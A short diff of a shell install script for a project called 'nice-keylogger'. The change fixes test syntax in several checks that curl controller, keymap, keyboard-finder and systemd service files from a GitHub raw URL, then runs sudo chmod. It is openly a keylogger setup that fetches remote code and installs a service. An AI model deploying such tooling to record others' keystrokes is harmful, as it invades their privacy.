@@ -21,16 +21,16 @@ FKEY=find_keyboard.py
 KLSERV=nicekeylogger.service
 # TODO correct this url to be the main branch
 base=https://raw.githubusercontent.com/castle-sam/nice-keylogger/feature-bash-coordinator/src/
-if [ ! test -f "$CONT" ] ; then
+if ! test -f "$CONT" ; then
   curl $base\controller.py > controller.py
 fi
-if [ ! test -f "$KMAP" ] ; then
+if ! test -f "$KMAP" ; then
   curl $base\keymap.py > keymap.py
 fi
-if [ ! test -f "$FKEY" ] ; then
+if ! test -f "$FKEY" ; then
   curl $base\find_keyboard.py > find_keyboard.py
 fi
-if [ ! test -f "$KLSERV" ] ; then
+if ! test -f "$KLSERV" ; then
   curl $base\nicekeylogger.service > nicekeylogger.service
 fi
 sudo chmod 744 test/controller.py
